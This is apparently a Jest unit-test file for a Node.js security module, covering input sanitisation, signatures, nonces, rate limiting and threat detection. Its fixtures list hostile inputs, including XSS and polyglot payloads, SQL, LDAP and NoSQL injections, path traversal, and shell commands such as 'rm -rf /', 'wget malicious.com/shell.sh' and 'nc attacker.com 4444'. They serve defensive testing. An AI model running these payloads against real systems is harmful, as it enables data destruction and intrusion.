/**
 * Security Module Unit Tests
 * Comprehensive test suite for security input validation boundaries and edge cases
 */

import { jest } from '@jest/globals';

// Mock logger before importing security
const mockLogger = {
  audit: jest.fn(),
  security: jest.fn(),
  info: jest.fn(),
  warn: jest.fn(),
  error: jest.fn()
};

jest.unstable_mockModule('../../src/utils/logger.js', () => ({
  default: mockLogger
}));

// Import the Security class after mocking logger
const { Security } = await import('../../src/security.js');

describe('Security', () => {
  let security;

  beforeEach(() => {
    jest.clearAllMocks();
    security = new Security();
  });

  // Add proper cleanup
  afterAll(async () => {
    if (security && typeof security.cleanup === 'function') {
      await security.cleanup();
    }
  });

  describe('Input Validation', () => {
    test('should validate safe strings', () => {
      const safeInputs = [
        'normal text',
        'email@example.com',
        'user123',
        'Simple sentence with spaces.',
        'Numbers 123 and symbols -_.'
      ];

      safeInputs.forEach(input => {
        expect(security.validateInput(input)).toBe(true);
      });
    });

    test('should sanitize malicious script injections (v2.2.2 behavior)', () => {
      const maliciousInputs = [
        { input: '<script>alert("xss")</script>', desc: 'script tag' },
        { input: 'javascript:alert(1)', desc: 'javascript protocol' },
        { input: 'data:text/html,<script>alert(1)</script>', desc: 'data URI' },
        { input: 'vbscript:msgbox("xss")', desc: 'vbscript' },
        { input: '<img src=x onerror=alert(1)>', desc: 'onerror handler' },
        { input: '<svg onload=alert(1)>', desc: 'onload handler' },
        { input: '<iframe src="javascript:alert(1)"></iframe>', desc: 'iframe' },
        { input: 'eval("alert(1)")', desc: 'eval' },
        { input: 'Function("alert(1)")()', desc: 'Function constructor' },
        { input: 'setTimeout("alert(1)", 0)', desc: 'setTimeout' }
      ];

      maliciousInputs.forEach(({ input, desc }) => {
        // validateQuestion sanitizes XSS patterns
        const result = security.validateQuestion(input);
        expect(result).toBeDefined();
        // Should have removed dangerous XSS patterns
        expect(result).not.toMatch(/<script/gi);
        expect(result).not.toMatch(/javascript:/gi);
        expect(result).not.toMatch(/on\w+\s*=/gi);
        expect(result).not.toMatch(/<iframe/gi);
      });
    });

    test('should sanitize SQL injection attempts (v2.2.2 behavior)', () => {
      const sqlInjections = [
        { input: "'; DROP TABLE users; --", desc: "DROP TABLE" },
        { input: "' OR '1'='1", desc: "OR equality" },
        { input: "' UNION SELECT * FROM passwords --", desc: "UNION SELECT" },
        { input: "admin'/*", desc: "SQL comment" },
        { input: "' OR 1=1#", desc: "OR 1=1" },
        { input: "'; INSERT INTO users VALUES ('hacker', 'password'); --", desc: "INSERT" },
        { input: "' AND (SELECT COUNT(*) FROM users) > 0 --", desc: "SELECT subquery" },
        { input: "1' OR SLEEP(5)#", desc: "SLEEP injection" }
      ];

      sqlInjections.forEach(({ input, desc }) => {
        // validateQuestion sanitizes instead of rejecting (v2.2.2)
        const result = security.validateQuestion(input);
        expect(result).toBeDefined();
        expect(result.length).toBeGreaterThan(0);
        // Sanitized output should not contain dangerous SQL patterns
        expect(result).not.toMatch(/;\s*(drop|insert|select|update|delete)/gi);
      });
    });

    test('should sanitize command injection attempts (v2.2.2 behavior)', () => {
      const commandInjections = [
        { input: '; rm -rf /', desc: 'rm -rf' },
        { input: '| cat /etc/passwd', desc: 'cat passwd' },
        { input: '&& rm -rf /', desc: 'rm with &&' },
        { input: '|| curl malicious.com', desc: 'curl with ||' },
        { input: '$(rm -rf /)', desc: 'command substitution' },
        { input: '`cat /etc/passwd`', desc: 'backtick substitution' },
        { input: '; wget malicious.com/shell.sh', desc: 'wget' },
        { input: '| nc attacker.com 4444', desc: 'netcat' },
        { input: '; python -c "import os; os.system(\'rm -rf /\')"', desc: 'python exec' }
      ];

      commandInjections.forEach(({ input, desc }) => {
        // validateQuestion sanitizes dangerous commands
        const result = security.validateQuestion(input);
        expect(result).toBeDefined();
        // Should have removed dangerous patterns
        expect(result).not.toMatch(/rm\s+-rf\s+[\/\w]/gi);
        expect(result).not.toMatch(/`[^`]+`/gi);
      });
    });

    test('should sanitize path traversal attempts (v2.2.2 behavior)', () => {
      const pathTraversals = [
        { input: '../../../etc/passwd', desc: 'relative path' },
        { input: '..\\..\\..\\windows\\system32\\config\\sam', desc: 'windows path' },
        { input: '....//....//....//etc/passwd', desc: 'obfuscated path' },
        { input: '/etc/passwd%00', desc: 'null byte' },
        { input: 'file:///etc/passwd', desc: 'file protocol' },
        { input: '..%2F..%2F..%2Fetc%2Fpasswd', desc: 'URL encoded' },
        { input: '..%252f..%252f..%252fetc%252fpasswd', desc: 'double encoded' }
      ];

      pathTraversals.forEach(({ input, desc }) => {
        // validateQuestion sanitizes path traversal patterns
        const result = security.validateQuestion(input);
        expect(result).toBeDefined();
        // Should have removed null bytes and file protocol
        expect(result).not.toMatch(/%00/);
        expect(result).not.toMatch(/\x00/);
      });
    });

    test('should handle null and undefined inputs', () => {
      expect(security.validateInput(null)).toBe(false);
      expect(security.validateInput(undefined)).toBe(false);
    });

    test('should handle non-string inputs', () => {
      const nonStringInputs = [
        123,
        true,
        false,
        {},
        [],
        function() {}
      ];

      nonStringInputs.forEach(input => {
        expect(security.validateInput(input)).toBe(false);
      });
    });

    test('should respect input length limits', () => {
      const longInput = 'a'.repeat(10000); // Very long input
      expect(security.validateInput(longInput)).toBe(false);

      const normalInput = 'a'.repeat(1000); // Normal length
      expect(security.validateInput(normalInput)).toBe(true);
    });

    test('should handle unicode and encoded inputs', () => {
      const unicodeInputs = [
        '测试中文',
        'тест русский',
        '🚀 emoji test',
        'café',
        'naïve'
      ];

      unicodeInputs.forEach(input => {
        expect(security.validateInput(input)).toBe(true);
      });

      const encodedMalicious = [
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '%22%3E%3Cscript%3Ealert(1)%3C/script%3E',
        '&lt;script&gt;alert(1)&lt;/script&gt;'
      ];

      encodedMalicious.forEach(input => {
        expect(security.validateInput(input)).toBe(false);
      });
    });
  });

  describe('HMAC Signature Validation', () => {
    test('should generate signatures in test environment', () => {
      const data = 'test message';
      const secret = 'test-secret';

      const signature = security.generateSignature(data, secret);

      expect(typeof signature).toBe('string');
      expect(signature).toContain('mock-signature-');
    });

    test('should validate correct signatures', () => {
      const data = 'test message';
      const secret = 'test-secret';

      // Generate a signature first
      const signature = security.generateSignature(data, secret);

      // Then validate it
      const isValid = security.validateSignature(data, signature, secret);

      expect(isValid).toBe(true);
    });

    test('should reject invalid signatures', () => {
      const data = 'test message';
      const secret = 'test-secret';
      const invalidSignature = 'invalid-signature';

      const isValid = security.validateSignature(data, invalidSignature, secret);

      expect(isValid).toBe(false);
    });

    test('should handle empty or null signatures', () => {
      const data = 'test message';
      const secret = 'test-secret';

      expect(security.validateSignature(data, '', secret)).toBe(false);
      expect(security.validateSignature(data, null, secret)).toBe(false);
      expect(security.validateSignature(data, undefined, secret)).toBe(false);
    });
  });

  describe('Nonce Generation and Validation', () => {
    test('should generate nonces', () => {
      const nonce = security.generateNonce();
      expect(typeof nonce).toBe('string');
      expect(nonce.length).toBeGreaterThan(0);
    });

    test('should validate unique nonces', () => {
      const nonce = 'test-nonce-123';
      expect(security.validateNonce(nonce)).toBe(true);

      // Same nonce should be rejected (replay protection)
      expect(security.validateNonce(nonce)).toBe(false);
    });

    test('should reject invalid nonce formats', () => {
      expect(security.validateNonce(null)).toBe(false);
      expect(security.validateNonce(undefined)).toBe(false);
      expect(security.validateNonce(123)).toBe(false);
    });
  });

  describe('Timestamp Validation', () => {
    test('should validate current timestamps', () => {
      const currentTime = Date.now();
      expect(security.validateTimestamp(currentTime)).toBe(true);
    });

    test('should reject old timestamps', () => {
      const oldTime = Date.now() - 600000; // 10 minutes ago
      expect(security.validateTimestamp(oldTime)).toBe(false);
    });

    test('should reject future timestamps', () => {
      const futureTime = Date.now() + 600000; // 10 minutes in future
      expect(security.validateTimestamp(futureTime)).toBe(false);
    });

    test('should handle invalid timestamp formats', () => {
      expect(security.validateTimestamp(null)).toBe(false);
      expect(security.validateTimestamp(undefined)).toBe(false);
      expect(security.validateTimestamp('invalid')).toBe(false);
    });
  });

  describe('Rate Limiting', () => {
    test('should create rate limit middleware', () => {
      const middleware = security.rateLimitMiddleware({
        maxRequests: 10,
        windowMs: 60000
      });

      expect(typeof middleware).toBe('function');
    });

    test('should track request counts by IP', () => {
      const middleware = security.rateLimitMiddleware({
        maxRequests: 2,
        windowMs: 1000
      });

      const mockReq = { ip: '127.0.0.1' };
      const mockRes = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      };
      const mockNext = jest.fn();

      // First request should pass
      middleware(mockReq, mockRes, mockNext);
      expect(mockNext).toHaveBeenCalled();

      // Second request should pass
      middleware(mockReq, mockRes, mockNext);
      expect(mockNext).toHaveBeenCalledTimes(2);

      // Third request should be rate limited
      middleware(mockReq, mockRes, mockNext);
      expect(mockRes.status).toHaveBeenCalledWith(429);
    });

    test('should reset rate limit after window expires', async () => {
      const middleware = security.rateLimitMiddleware({
        maxRequests: 1,
        windowMs: 100 // Very short window
      });

      const mockReq = { ip: '127.0.0.1' };
      const mockRes = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      };
      const mockNext = jest.fn();

      // First request
      middleware(mockReq, mockRes, mockNext);
      expect(mockNext).toHaveBeenCalled();

      // Second request should be blocked
      middleware(mockReq, mockRes, mockNext);
      expect(mockRes.status).toHaveBeenCalledWith(429);

      // Wait for window to expire
      await new Promise(resolve => setTimeout(resolve, 150));

      // Third request should pass after window reset
      mockNext.mockClear();
      middleware(mockReq, mockRes, mockNext);
      expect(mockNext).toHaveBeenCalled();
    });

    test('should handle custom key generator', () => {
      const customKeyGenerator = jest.fn(req => `custom-${req.userId}`);

      const middleware = security.rateLimitMiddleware({
        maxRequests: 1,
        windowMs: 1000,
        keyGenerator: customKeyGenerator
      });

      const mockReq = { ip: '127.0.0.1', userId: 'user123' };
      const mockRes = { status: jest.fn().mockReturnThis(), json: jest.fn() };
      const mockNext = jest.fn();

      middleware(mockReq, mockRes, mockNext);

      expect(customKeyGenerator).toHaveBeenCalledWith(mockReq);
    });
  });

  describe('Security Headers Middleware', () => {
    test('should add security headers', () => {
      const middleware = security.securityHeadersMiddleware();
      const mockReq = {};
      const mockRes = {
        setHeader: jest.fn()
      };
      const mockNext = jest.fn();

      middleware(mockReq, mockRes, mockNext);

      expect(mockRes.setHeader).toHaveBeenCalledWith('X-Content-Type-Options', 'nosniff');
      expect(mockRes.setHeader).toHaveBeenCalledWith('X-Frame-Options', 'DENY');
      expect(mockRes.setHeader).toHaveBeenCalledWith('X-XSS-Protection', '1; mode=block');
      expect(mockRes.setHeader).toHaveBeenCalledWith(
        'Strict-Transport-Security',
        'max-age=31536000; includeSubDomains'
      );
      expect(mockNext).toHaveBeenCalled();
    });
  });

  describe('Audit Middleware', () => {
    test('should log request details', () => {
      mockLogger.audit.mockClear();
      const middleware = security.auditMiddleware();

      const mockReq = {
        method: 'POST',
        url: '/api/test',
        ip: '127.0.0.1',
        headers: { 'user-agent': 'test-agent' },
        body: { data: 'test' }
      };
      const mockRes = {};
      const mockNext = jest.fn();

      middleware(mockReq, mockRes, mockNext);

      expect(mockLogger.audit).toHaveBeenCalled();
      expect(mockNext).toHaveBeenCalled();
    });

    test('should detect suspicious patterns', () => {
      mockLogger.security.mockClear();
      const middleware = security.auditMiddleware();

      const suspiciousReq = {
        method: 'POST',
        url: '/api/test',
        ip: '127.0.0.1',
        headers: { 'user-agent': 'test-agent' },
        body: { data: '<script>alert(1)</script>' }
      };
      const mockRes = {};
      const mockNext = jest.fn();

      middleware(suspiciousReq, mockRes, mockNext);

      // Check that logger.security was called to log suspicious request
      expect(mockLogger.security).toHaveBeenCalledWith(
        'Suspicious request detected',
        expect.any(Object)
      );
    });
  });

  describe('Signature Middleware', () => {
    test('should skip validation when signing disabled', () => {
      // Temporarily disable signing for this test
      const originalSigningEnabled = security.ENABLE_REQUEST_SIGNING;
      security.ENABLE_REQUEST_SIGNING = false;

      const middleware = security.signatureMiddleware();

      const mockReq = {
        headers: {},
        body: { data: 'test' }
      };
      const mockRes = {};
      const mockNext = jest.fn();

      middleware(mockReq, mockRes, mockNext);

      expect(mockNext).toHaveBeenCalled();

      // Restore original setting
      security.ENABLE_REQUEST_SIGNING = originalSigningEnabled;
    });

    test('should validate request signatures when enabled', () => {
      // Ensure signing is enabled
      security.ENABLE_REQUEST_SIGNING = true;

      const middleware = security.signatureMiddleware();

      // Generate proper signature for the request
      const timestamp = Date.now().toString();
      const mockReq = {
        method: 'POST',
        url: '/api/test',
        headers: {
          'x-timestamp': timestamp
        },
        body: { data: 'test' },
        rawBody: '{"data":"test"}'
      };

      // Generate signature for this specific request
      const dataToSign = `${mockReq.method}:${mockReq.url}:${timestamp}:${mockReq.rawBody}`;
      const signature = security.generateSignature(dataToSign);
      mockReq.headers['x-signature'] = signature;

      const mockRes = {};
      const mockNext = jest.fn();

      middleware(mockReq, mockRes, mockNext);

      expect(mockNext).toHaveBeenCalled();
    });

    test('should reject requests without signatures when enabled', () => {
      security.ENABLE_REQUEST_SIGNING = true;

      const middleware = security.signatureMiddleware();

      const mockReq = {
        headers: {},
        body: { data: 'test' }
      };
      const mockRes = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      };
      const mockNext = jest.fn();

      middleware(mockReq, mockRes, mockNext);

      expect(mockRes.status).toHaveBeenCalledWith(401);
      expect(mockNext).not.toHaveBeenCalled();
    });

    test('should reject expired timestamps', () => {
      security.ENABLE_REQUEST_SIGNING = true;

      const middleware = security.signatureMiddleware();

      const mockReq = {
        headers: {
          'x-signature': 'test-signature',
          'x-timestamp': (Date.now() - 600000).toString() // 10 minutes old
        },
        body: { data: 'test' },
        rawBody: '{"data":"test"}'
      };
      const mockRes = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn()
      };
      const mockNext = jest.fn();

      middleware(mockReq, mockRes, mockNext);

      expect(mockRes.status).toHaveBeenCalledWith(401);
      expect(mockNext).not.toHaveBeenCalled();
    });
  });

  describe('Content Validation', () => {
    test('should validate JSON content', () => {
      const validJson = '{"key": "value", "number": 123}';
      expect(security.validateJsonContent(validJson)).toBe(true);

      const invalidJson = '{"key": "value", "malicious": "<script>alert(1)</script>"}';
      expect(security.validateJsonContent(invalidJson)).toBe(false);
    });

    test('should detect prototype pollution attempts', () => {
      const pollutionAttempts = [
        '{"__proto__": {"isAdmin": true}}',
        '{"constructor": {"prototype": {"isAdmin": true}}}',
        '{"prototype": {"isAdmin": true}}',
        '{"__proto__.isAdmin": true}'
      ];

      pollutionAttempts.forEach(attempt => {
        expect(security.validateJsonContent(attempt)).toBe(false);
      });
    });

    test('should handle malformed JSON gracefully', () => {
      const malformedJson = '{"key": value}'; // Missing quotes
      expect(security.validateJsonContent(malformedJson)).toBe(false);
    });
  });

  describe('IP Address Validation', () => {
    test('should validate legitimate IP addresses', () => {
      const validIPs = [
        '192.168.1.1',
        '10.0.0.1',
        '172.16.0.1',
        '127.0.0.1',
        '8.8.8.8'
      ];

      validIPs.forEach(ip => {
        expect(security.validateIPAddress(ip)).toBe(true);
      });
    });

    test('should reject suspicious IP patterns', () => {
      const suspiciousIPs = [
        '0.0.0.0',
        '255.255.255.255',
        '127.0.0.1; rm -rf /',
        '192.168.1.1<script>',
        'not.an.ip.address'
      ];

      suspiciousIPs.forEach(ip => {
        expect(security.validateIPAddress(ip)).toBe(false);
      });
    });
  });

  describe('Path Validation', () => {
    test('should validate safe paths', () => {
      const safePaths = [
        '/usr/local/bin/app',
        '/home/user/documents/file.txt',
        '/opt/app/config.json',
        'C:\\Program Files\\App\\file.exe'
      ];

      safePaths.forEach(path => {
        expect(security.validatePath(path)).toBe(true);
      });
    });

    test('should reject path traversal attempts', () => {
      const dangerousPaths = [
        '../../../etc/passwd',
        '..\\..\\windows\\system32',
        '~/secret/file.txt',
        '/path/../../../etc/passwd'
      ];

      dangerousPaths.forEach(path => {
        expect(security.validatePath(path)).toBe(false);
      });
    });

    test('should handle invalid path inputs', () => {
      expect(security.validatePath(null)).toBe(false);
      expect(security.validatePath(undefined)).toBe(false);
      expect(security.validatePath(123)).toBe(false);
    });

    test('should respect path length limits', () => {
      const longPath = '/very/long/path/' + 'a'.repeat(1000);
      expect(security.validatePath(longPath)).toBe(false);
    });
  });

  describe('Output Sanitization', () => {
    test('should sanitize sensitive information', () => {
      const sensitiveText = `
        API Key: sk-1234567890abcdef1234567890abcdef
        Bearer Token: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
        Secret: "my-secret-key-12345678"
        Password: "mypassword123"
        Email: user@example.com
        File: /Users/john/documents/secret.txt
      `;

      const sanitized = security.sanitizeOutput(sensitiveText);

      expect(sanitized).toContain('[API_KEY_REDACTED]');
      expect(sanitized).toContain('[BEARER_TOKEN_REDACTED]');
      expect(sanitized).toContain('[REDACTED]');
      expect(sanitized).toContain('[EMAIL_REDACTED]');
      expect(sanitized).toContain('[USER_PATH_REDACTED]');
    });

    test('should handle non-string inputs', () => {
      expect(security.sanitizeOutput(null)).toBe(null);
      expect(security.sanitizeOutput(undefined)).toBe(undefined);
      expect(security.sanitizeOutput(123)).toBe(123);
    });
  });

  describe('Security Configuration', () => {
    test('should return security status', () => {
      const status = security.getSecurityStatus();

      expect(status).toHaveProperty('enabled');
      expect(status).toHaveProperty('features');
      expect(status.features).toHaveProperty('inputValidation');
      expect(status.features).toHaveProperty('rateLimiting');
      expect(status.features).toHaveProperty('signatureValidation');
    });

    test('should allow security feature configuration', () => {
      security.configure({
        inputValidation: false,
        rateLimiting: true,
        signatureValidation: true
      });

      const status = security.getSecurityStatus();
      expect(status.features.inputValidation).toBe(false);
      expect(status.features.rateLimiting).toBe(true);
    });
  });

  describe('Advanced Threat Detection', () => {
    test('should detect polyglot attacks', () => {
      const polyglotAttacks = [
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert(\'XSS\') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(//XSS//)//\\x3e',
        '\'"(,;!--<XSS>=&{()}',
        '<svg/onload=alert(String.fromCharCode(88,83,83))>',
        'javascript://\'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*',
        '<img src="x" onerror="javascript:alert(1)">'
      ];

      polyglotAttacks.forEach(attack => {
        expect(security.validateInput(attack)).toBe(false);
      });
    });

    test('should detect LDAP injection attempts', () => {
      const ldapInjections = [
        '*)(uid=*',
        '*)(|(uid=*))',
        '*))(|(uid=*',
        '*))%00',
        '*()|(%26'
      ];

      ldapInjections.forEach(injection => {
        expect(security.validateInput(injection)).toBe(false);
      });
    });

    test('should detect NoSQL injection attempts', () => {
      const nosqlInjections = [
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "function() { return true; }"}',
        '{"$gt": ""}',
        '{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}'
      ];

      nosqlInjections.forEach(injection => {
        expect(security.validateJsonContent(injection)).toBe(false);
      });
    });
  });

  describe('Error Handling and Edge Cases', () => {
    test('should handle validation errors gracefully', () => {
      // Mock validation to throw error
      const originalValidate = security.validateInput;
      security.validateInput = jest.fn(() => {
        throw new Error('Validation error');
      });

      expect(() => security.validateInput('test')).toThrow('Validation error');

      // Restore
      security.validateInput = originalValidate;
    });

    test('should handle extremely large inputs', () => {
      const hugeInput = 'x'.repeat(1000000); // 1MB string
      expect(security.validateInput(hugeInput)).toBe(false);
    });

    test('should handle binary data', () => {
      const binaryData = Buffer.from([0x00, 0x01, 0x02, 0x03]).toString();
      expect(security.validateInput(binaryData)).toBe(false);
    });

    test('should handle null bytes', () => {
      const nullByteInputs = [
        'test\x00injection',
        'file.txt\0.exe',
        'query\x00; DROP TABLE users'
      ];

      nullByteInputs.forEach(input => {
        expect(security.validateInput(input)).toBe(false);
      });
    });
  });

  describe('Outgoing Request Signing', () => {
    test('should sign outgoing requests', () => {
      const method = 'POST';
      const url = '/api/test';
      const body = { data: 'test' };
      const apiKey = 'test-api-key';

      const result = security.signOutgoingRequest(method, url, body, apiKey);

      expect(result).toHaveProperty('headers');
      expect(result.headers).toHaveProperty('X-Timestamp');
      expect(result.headers).toHaveProperty('X-Nonce');
      expect(result.headers).toHaveProperty('X-Signature');
      expect(result).toHaveProperty('signedData');
    });

    test('should handle signing errors gracefully', () => {
      // Mock generateSignature to throw error
      const originalGenerate = security.generateSignature;
      security.generateSignature = jest.fn(() => {
        throw new Error('Signing error');
      });

      const result = security.signOutgoingRequest('POST', '/api/test', {}, 'key');

      expect(result.headers).toEqual({});

      // Restore
      security.generateSignature = originalGenerate;
    });
  });
});